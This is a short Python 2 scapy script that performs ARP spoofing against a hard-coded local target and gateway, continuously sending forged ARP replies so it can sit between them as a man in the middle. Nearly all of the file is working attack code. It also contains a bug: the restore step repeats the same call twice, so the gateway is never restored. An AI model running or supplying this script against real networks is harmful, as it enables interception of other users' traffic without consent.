#!/usr/bin/python2

import scapy.all as scapy
import time
import sys

def getmac(ip):
	
	arp_request = scapy.ARP(pdst = ip)
	#creating arp_request object with dst_ip=user_input_ip

	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	#create a broadcast object to have Ether frame property with dst_mac = ff:ff:ff:ff:ff:ff

	arp_request_broadcast = broadcast/arp_request
	#combine the Ether frame to arp_request to send

	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	#scapy.srp to send the packet in layer2 Ether fram which returns 2 value answered,unanswered
	#timeout=1 specify wait for 1 sec not till you getting replay	

	return  answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):

	dst_mac = getmac(target_ip)
	
	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
	#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")

	scapy.send(arp_respond,verbose=False)

def restore(destination_ip,source_ip):

	dst_mac=getmac(destination_ip)
	src_mac=getmac(source_ip)
	arp_respond = scapy.ARP(op=2,pdst=destination_ip,hwdst=dst_mac,psrc=source_ip,hwsrc=src_mac)
	scapy.send(arp_respond,verbose=False,count=4)


count = 0

target_ip = "192.168.43.191"
gateway_ip = "192.168.43.1"
try:
	while True:

		spoof(target_ip,gateway_ip)
		#telling client i am the router

		spoof(gateway_ip,target_ip)
		#telling router i am the client
		count = count + 2
		print "\r[+] send two packets "+str(count),
		sys.stdout.flush()

		time.sleep(2)

except KeyboardInterrupt:

		print "\n[+] Detected CTRL+C Quitting and restoring arp value please wait"
		restore(target_ip,gateway_ip)
		#restoring client
		restore(target_ip,gateway_ip)
		#restoring router